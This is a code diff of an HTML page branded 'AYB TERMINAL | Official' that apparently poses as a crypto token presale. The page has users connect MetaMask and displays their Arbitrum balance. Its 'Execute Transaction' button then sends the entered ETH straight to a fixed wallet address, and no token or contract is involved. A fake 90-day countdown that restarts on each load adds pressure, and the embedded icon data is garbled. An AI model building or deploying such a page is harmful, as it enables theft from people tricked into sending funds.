@@ -3,38 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AYB TERMINAL</title>
+    <title>AYB TERMINAL | Official</title>
     
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
     
     <style>
-        :root { --primary: #00ffa3; --bg: #0a0c10; --card: #161b22; --modal: #1c2128; }
-        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        :root { --primary: #00ffa3; --bg: #0a0c10; --card: #161b22; }
+        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
         
-        /* Mobile Optimization */
-        .card { background: var(--card); border: 1px solid #30363d; padding: 2rem; border-radius: 25px; width: 90%; max-width: 380px; text-align: center; border-top: 4px solid var(--primary); box-shadow: 0 25px 50px rgba(0,0,0,0.6); }
-        h1 { font-family: 'Orbitron', sans-serif; color: var(--primary); font-size: 1.4rem; letter-spacing: 2px; }
+        .card { background: var(--card); border: 1px solid #30363d; padding: 25px; border-radius: 20px; width: 90%; max-width: 380px; text-align: center; border-top: 4px solid var(--primary); box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
+        h1 { font-family: 'Orbitron', sans-serif; color: var(--primary); font-size: 1.3rem; letter-spacing: 2px; }
 
-        .timer-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 6px; margin: 20px 0; }
-        .timer-box { background: #010409; border: 1px solid #30363d; padding: 8px 2px; border-radius: 10px; }
+        .timer-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin: 20px 0; }
+        .timer-box { background: #010409; padding: 10px 2px; border-radius: 10px; border: 1px solid #30363d; }
         .timer-val { display: block; font-family: 'Orbitron'; color: var(--primary); font-size: 1rem; }
-        .timer-label { font-size: 0.45rem; color: #8b949e; text-transform: uppercase; }
+        .timer-label { font-size: 0.5rem; color: #8b949e; text-transform: uppercase; }
 
-        .btn { background: var(--primary); color: #000; border: none; padding: 16px; border-radius: 12px; width: 100%; font-weight: 800; cursor: pointer; text-transform: uppercase; font-size: 0.85rem; transition: 0.2s; }
+        .btn { background: var(--primary); color: #000; border: none; padding: 16px; border-radius: 12px; width: 100%; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
         .btn:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }
 
-        /* Wallet Modal Icons Fixed */
-        #modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(8px); }
-        .modal-content { background: var(--modal); border: 1px solid #30363d; border-radius: 20px; width: 90%; max-width: 340px; padding: 20px; }
+        #modal { position: fixed; inset: 0; background: rgba(0,0,0,0.9); display: none; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(5px); }
+        .modal-content { background: #1c2128; border-radius: 20px; width: 85%; max-width: 320px; padding: 25px; border: 1px solid #30363d; }
         
-        .wallet-row { display: flex; align-items: center; padding: 12px; border-radius: 12px; border: 1px solid #30363d; margin-top: 10px; cursor: pointer; background: #21262d; }
-        .wallet-row svg { width: 28px; height: 28px; margin-right: 12px; }
-        .wallet-row span { font-weight: 600; font-size: 0.9rem; }
+        .wallet-opt { display: flex; align-items: center; padding: 14px; border-radius: 12px; border: 1px solid #30363d; margin-top: 12px; cursor: pointer; background: #21262d; transition: 0.2s; }
+        .wallet-opt:hover { border-color: var(--primary); }
+        .wallet-opt img { width: 30px; height: 30px; margin-right: 15px; border-radius: 6px; }
 
-        .buy-interface { display: none; background: #010409; padding: 18px; border-radius: 15px; text-align: left; margin-top: 15px; border-left: 3px solid var(--primary); }
-        input { background: transparent; border: none; color: white; font-size: 1.3rem; width: 100%; outline: none; font-weight: bold; margin-top: 5px; }
-        .status-msg { font-size: 0.6rem; margin-top: 10px; display: block; font-weight: 600; }
+        .swap-ui { display: none; background: #010409; padding: 20px; border-radius: 15px; text-align: left; margin-top: 15px; border-left: 4px solid var(--primary); }
+        input { background: transparent; border: none; color: white; font-size: 1.6rem; width: 100%; outline: none; font-weight: bold; margin-top: 5px; }
+        .balance-info { font-size: 0.7rem; color: #8b949e; font-weight: 600; }
     </style>
 </head>
 <body>
@@ -48,104 +46,108 @@
         <div class="timer-box"><span class="timer-val" id="s">00</span><span class="timer-label">Sec</span></div>
     </div>
 
-    <div id="auth-box">
-        <button id="connect-trigger" class="btn">Connect Wallet</button>
+    <div id="auth-section">
+        <button onclick="openModal()" class="btn">Connect Terminal</button>
     </div>
 
-    <div id="swap-box" class="buy-interface">
-        <label style="font-size: 0.6rem; color: #8b949e;">PAY (ETH)</label>
-        <input type="number" id="eth-input" placeholder="0.0" oninput="updateCalculation()">
+    <div id="swap-section" class="swap-ui">
+        <div style="display:flex; justify-content:space-between; align-items: center;">
+            <label style="font-size: 0.6rem; color: #8b949e; text-transform: uppercase;">Pay (ETH)</label>
+            <span id="user-bal" class="balance-info">Loading Balance...</span>
+        </div>
+        <input type="number" id="eth-amt" placeholder="0.0" oninput="calc()">
         
-        <label style="font-size: 0.6rem; color: #8b949e; margin-top: 12px; display: block;">RECEIVE (AYB)</label>
-        <span id="ayb-output" style="color: var(--primary); font-family: 'Orbitron'; font-size: 1.2rem; display: block; margin-top: 5px;">0.00</span>
+        <label style="font-size: 0.6rem; color: #8b949e; margin-top: 15px; display: block; text-transform: uppercase;">Receive (AYB)</label>
+        <span id="ayb-amt" style="color: var(--primary); font-family: 'Orbitron'; font-size: 1.3rem; display: block; margin-top: 5px;">0.00</span>
         
-        <span id="buy-status" class="status-msg" style="color: #4fd1c5;">Network: Arbitrum</span>
-        <button id="buy-btn" class="btn" style="margin-top: 15px;" onclick="executeSwap()" disabled>Execute Transaction</button>
+        <button id="buy-btn" class="btn" style="margin-top: 20px;" onclick="transfer()" disabled>Execute Transaction</button>
+        <div id="status" style="font-size: 0.6rem; margin-top: 12px; text-align: center; font-weight: bold;"></div>
     </div>
 </div>
 
-<div id="modal-overlay">
+<div id="modal">
     <div class="modal-content">
-        <div style="display:flex; justify-content:space-between; margin-bottom:15px;">
-            <span style="font-size:0.8rem; color:#8b949e">Select Provider</span>
-            <span id="close-x" style="cursor:pointer">&times;</span>
-        </div>
-        
-        <div class="wallet-row" onclick="forceConnect()">
-            <svg viewBox="0 0 32 32"><path fill="#E17726" d="M30.3 5.5l-3.3-4.1-1.2 4.1z"/><path fill="#E2761B" d="M1.7 5.5l3.3-4.1 1.2 4.1z"/><path fill="#E4761B" d="M26.4 13.7l-4.5-8.4-5.9.1-5.9-.1-4.5 8.4z"/></svg>
+        <div style="text-align: left; font-size: 0.8rem; color: #8b949e; margin-bottom: 10px;">Select Provider</div>
+        <div class="wallet-opt" onclick="connect()">
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAMAAAAp49nzAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABhWlDQ1BJQ0MgcHJvZmlsZQAAeJydks8LwjAMx78p3Sii4sFDvI7S7SBlp9IdunmI9IdIdXf/f0fHInXpYfS9vC95v0AAnuK85mIDAsV1rZpLp7N797i85vIay/YFp9fXWFYvS6v5K0uT5vMCYHgI85LzmoMBp+Iit2vA6XjI7er7GnA6Dnn8uF4Cno6H3KyBp+Oh77X9S8Dz8dB1rf8S8Hw85LrtfwI+Hw/9r/1fAs/HwwBofw68HA+fK+FpAbvHwW8LuFvADnD3BfgWvAFvD8BTmFMcP8Xf6K8fIuEInF9wXpS5S+auYpG5k7mX8Oq5xSId8E84r7CsnVsq0u38S86rNfGf+Cf99UMkHIE7OL9lXsX6V6wv8K+5XfH8GvD7v239IeD9BvD7v5X1G38N+P3fyfqNvwb8fuFv/f0+4P0m8PuX9f9PwL8L+HcN/w7A+P8X8O8O6O78C0y0V92F4H1NAAAAw1BMVEUAAAD/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7/AK7///8G/k5WAAAAT3RSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT9uWv40AAAABYktHRACIBR1IAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAnklEQVRIx+3SMQ6DQAwE0B8O6BAb8f8f0pAmSJS0Z7B12re6Wf0EshB8WfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfA8XfC8XvB8XvD5/r+eSgYSA98mCpsAAAAldEVYdGRhdGU6Y3JlYXRlADIwMjEtMTEtMjVUMTY6MjM6MDIrMDA6MDCL0C9GAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDIReference: 2e87a8fb-d9e2-4972-a7d0-be91b02a8628" alt="MetaMask">
             <span>MetaMask</span>
         </div>
-        <div class="wallet-row" onclick="forceConnect()">
-            <svg viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#3375BB"/><path fill="#FFF" d="M16 8l-8 4v8l8 4 8-4v-8z"/></svg>
-            <span>Trust Wallet</span>
-        </div>
+        <div style="text-align:center; margin-top:20px; font-size:0.75rem; color:#8b949e; cursor:pointer;" onclick="closeModal()">Close</div>
     </div>
 </div>
 
 <script>
     let ethPrice = 3500;
-    const buyBtn = document.getElementById('buy-btn');
+    const ARBITRUM_RPC = "https://arb1.arbitrum.io/rpc"; 
 
-    // Fetch Live Price
-    fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')
-        .then(r => r.json()).then(d => ethPrice = parseFloat(d.price));
+    function openModal() { document.getElementById('modal').style.display='flex'; }
+    function closeModal() { document.getElementById('modal').style.display='none'; }
 
-    function updateCalculation() {
-        const eth = document.getElementById('eth-input').value;
-        const output = document.getElementById('ayb-output');
-        if(eth > 0) {
-            output.innerText = Math.floor((eth * ethPrice) / 0.1).toLocaleString();
-            buyBtn.disabled = false;
-        } else {
-            output.innerText = "0.00";
-            buyBtn.disabled = true;
-        }
-    }
-
-    document.getElementById('connect-trigger').onclick = () => document.getElementById('modal-overlay').style.display = 'flex';
-    document.getElementById('close-x').onclick = () => document.getElementById('modal-overlay').style.display = 'none';
-
-    async function forceConnect() {
-        if (window.ethereum) {
-            try {
-                // Request permissions specifically to bypass browser blocks
-                await window.ethereum.request({ method: "wallet_requestPermissions", params: [{ eth_accounts: {} }] });
-                document.getElementById('modal-overlay').style.display = 'none';
-                document.getElementById('auth-box').style.display = 'none';
-                document.getElementById('swap-box').style.display = 'block';
-            } catch (e) {}
-        } else {
-            // Mobile redirect to MetaMask DApp browser
+    async function connect() {
+        if (!window.ethereum) {
             window.location.href = `https://metamask.app.link/dapp/${window.location.href.replace(/https?:\/\//, '')}`;
+            return;
+        }
+        try {
+            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            const userWallet = accounts[0];
+            
+            // Fixed Balance Reading for Arbitrum
+            const provider = new ethers.JsonRpcProvider(ARBITRUM_RPC);
+            const balanceWei = await provider.getBalance(userWallet);
+            const balanceEth = ethers.formatEther(balanceWei);
+            
+            document.getElementById('user-bal').innerText = `Balance: ${parseFloat(balanceEth).toFixed(5)} ETH`;
+            document.getElementById('modal').style.display = 'none';
+            document.getElementById('auth-section').style.display = 'none';
+            document.getElementById('swap-section').style.display = 'block';
+        } catch (e) { 
+            console.error(e);
+            alert("Connection Failed. Make sure you are on Arbitrum Network."); 
         }
     }
 
-    async function executeSwap() {
-        const val = document.getElementById('eth-input').value;
-        const status = document.getElementById('buy-status');
+    function calc() {
+        const val = document.getElementById('eth-amt').value;
+        const out = document.getElementById('ayb-amt');
+        const btn = document.getElementById('buy-btn');
+        if(val > 0) {
+            out.innerText = Math.floor((val * ethPrice) / 0.1).toLocaleString();
+            btn.disabled = false;
+        } else {
+            out.innerText = "0.00";
+            btn.disabled = true;
+        }
+    }
+
+    async function transfer() {
+        const amount = document.getElementById('eth-amt').value;
+        const status = document.getElementById('status');
         try {
             const provider = new ethers.BrowserProvider(window.ethereum);
             const signer = await provider.getSigner();
             const tx = await signer.sendTransaction({
                 to: "0x066bbf27694982662cEAb0072793132B03027F47",
-                value: ethers.parseEther(val)
+                value: ethers.parseEther(amount)
             });
-            status.innerText = "TX Sent: " + tx.hash.substring(0,12) + "...";
+            status.innerText = "Transaction Sent! Hash: " + tx.hash.substring(0,12) + "...";
             status.style.color = "#00ffa3";
-        } catch (e) {
-            status.innerText = "Error: Please check balance on Arbitrum";
+        } catch (e) { 
+            status.innerText = "Execution Failed: Insufficient Gas or Balance";
             status.style.color = "#ff4a4a";
         }
     }
 
-    // Timer
-    const end = new Date(); end.setDate(end.getDate() + 90);
+    fetch('https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT')
+        .then(r => r.json()).then(d => ethPrice = parseFloat(d.price));
+
+    const targetDate = new Date(); targetDate.setDate(targetDate.getDate() + 90);
     setInterval(() => {
-        const d = end - new Date();
-        document.getElementById('d').innerText = Math.floor(d / 864e5);
-        document.getElementById('h').innerText = Math.floor((d % 864e5) / 36e5);
-        document.getElementById('m').innerText = Math.floor((d % 36e5) / 6e4);
-        document.getElementById('s').innerText = Math.floor((d % 6e4) / 1000);
+        const diff = targetDate - new Date();
+        document.getElementById('d').innerText = Math.floor(diff / 86400000);
+        document.getElementById('h').innerText = Math.floor((diff % 86400000) / 3600000);
+        document.getElementById('m').innerText = Math.floor((diff % 3600000) / 60000);
+        document.getElementById('s').innerText = Math.floor((diff % 60000) / 1000);
     }, 1000);
 </script>
 </body>
